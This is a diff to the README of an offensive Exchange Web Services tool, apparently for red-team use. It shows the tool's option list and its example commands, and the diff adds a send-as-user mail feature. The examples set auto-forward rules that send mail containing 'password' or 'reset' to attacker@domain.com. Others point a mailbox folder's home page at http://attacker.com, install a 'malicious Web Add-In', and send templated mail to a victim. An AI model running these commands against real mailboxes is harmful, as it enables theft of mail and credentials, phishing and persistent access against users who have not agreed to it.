@@ -1,6 +1,7 @@
 # EWSToolkit
 
 ```text
+C:\Users\dduggan>C:\Tools\EWSToolkit\EWSToolkit\bin\Debug\EWS.exe
  _____________      __  _________ ___________           .__   __   .__  __
  \_   _____/  \    /  \/   _____/ \__    ___/___   ____ |  | |  | _|__|/  |_
   |    __)_\   \/\/   /\_____  \    |    | /  _ \ /  _ \|  | |  |/ /  \   __\
@@ -11,25 +12,35 @@
                                                                       v0.1
 
   Options:
-  -e, --email=VALUE          Email address to authenticate with
-  -p, --password=VALUE       Password to authenticate with
+  -E, --Email=VALUE          Email address to authenticate with
+  -P, --Password=VALUE       Password to authenticate with
       --rule                 Set auto-forwarding rules on users' mailbox
-  -n, --name=VALUE           Set a name for the rule
+  -N, --Name=VALUE           Set a name for the rule
   -s, --subject=VALUE        Trigger on these strings in the mail Subject
   -b, --body=VALUE           Trigger on these strings in the mail Body
-  -f, --forward=VALUE        Email address to receive forwarded emails at
+  -F, --Forward=VALUE        Email address to receive forwarded emails at
+      --sendmail             Send an email an behalf of the current user
+  -R, --Recipients=VALUE     Send email to
+  -S, --Subject=VALUE        Email subject
+  -T, --Template=VALUE       Email template file
+  -t, --plaintext            Send email as plaintext, not HTML
+  -a, --attachment=VALUE     Send an attachement
+  -f, --from=VALUE           Send email from this account / mailbox
       --homefolder           Set a malicious URL on a folder
-  -u, --url=VALUE            URL to configure
+  -U, --Url=VALUE            URL to configure
       --installapp           Install a malicious Web Add-In
-  -m, --manifest=VALUE       Manifest to install
+  -M, --Manifest=VALUE       Manifest to install
   -h, -?, --help             Show this help
+
+  Uppercase parameters are mandatory for their respective functions.
 
   Examples:
   Set auto-forward rules
-    ews -e user@domain.com -p Passw0rd! --rule -n TestRule -s password,reset -f attacker@domain.com
-    ews -e user@domain.com -p Passw0rd! --rule -n TestRule -b "This is your new password" -f attacker@domain.com
+    ews -E user@domain.com -P Passw0rd! --rule -N TestRule -s password,reset -F attacker@domain.com
+  Send email
+    ews -E user@domain.com -P Passw0rd! --sendmail -R victim@domain.com -S "Hello" -T C:\Users\Rasta\Desktop\template.html
   Set HomeFolder URL
-    ews -e user@domain.com -p Passw0rd! --homefolder -u http://attacker.com
+    ews -E user@domain.com -P Passw0rd! --homefolder -U http://attacker.com
   Install MailApp
-    ews -e user@domain.com -p Passw0rd! --installapp -m C:\Users\Rasta\Desktop\manifest.xml
+    ews -E user@domain.com -P Passw0rd! --installapp -M C:\Users\Rasta\Desktop\manifest.xml
 ```
